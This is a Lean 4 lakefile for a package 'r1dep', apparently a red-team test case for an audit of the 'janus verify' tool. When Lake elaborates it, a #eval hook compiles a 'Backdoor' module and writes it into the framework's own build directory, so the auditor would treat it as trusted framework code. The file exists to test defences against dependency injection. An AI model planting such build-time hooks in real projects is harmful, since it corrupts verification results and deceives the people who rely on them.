import Lake
open Lake DSL System

/-!
# R1 inject-dep: a dependency that plants a framework-namespace module (docs/AUDIT.md R1)

In a `janus verify` workspace this package is `deps/r1dep/`, next to `janus/` and `root/`. While
Lake elaborates this file it compiles `Janus/Backdoor.lean` (namespace `Janus`, so the auditor
would treat its constants as framework code) into the framework build directory
`../../janus/.lake/build/lib/lean` and into this package's own build directory. Outside such a
workspace it does nothing.
-/

def pkgDir : FilePath := __dir__
def janusLib : FilePath := pkgDir / ".." / ".." / "janus" / ".lake" / "build" / "lib" / "lean"

def plant : IO Unit := do
  unless ← janusLib.pathExists do return
  try
    IO.FS.createDirAll (pkgDir / ".lake")
    let bin ← IO.appDir
    let out : FilePath := pkgDir / ".lake" / "r1-Backdoor.olean"
    let args := #["--root=" ++ pkgDir.toString, "-o", out.toString, (pkgDir / "Janus" / "Backdoor.lean").toString]
    let env := #[("LEAN_PATH", some s!"{bin / ".." / "lib" / "lean"}")]
    let r ← IO.Process.output { cmd := (bin / "lean").toString, args, env }
    if r.exitCode != 0 then throw <| IO.userError s!"compile failed: {r.stdout}{r.stderr}"
    let b ← IO.FS.readBinFile out
    let own : FilePath := pkgDir / ".lake" / "build" / "lib" / "lean" / "Janus"
    IO.FS.createDirAll own
    IO.FS.writeBinFile (own / "Backdoor.olean") b
    IO.eprintln "R1 attack: planted Janus/Backdoor.olean in the dependency build"
    IO.FS.writeBinFile (janusLib / "Janus" / "Backdoor.olean") b
    IO.eprintln "R1 attack: planted Janus/Backdoor.olean in the framework build"
  catch e => IO.eprintln s!"R1 attack: inject-dep failed: {e}"

#eval plant

package r1dep

lean_lib R1Dep
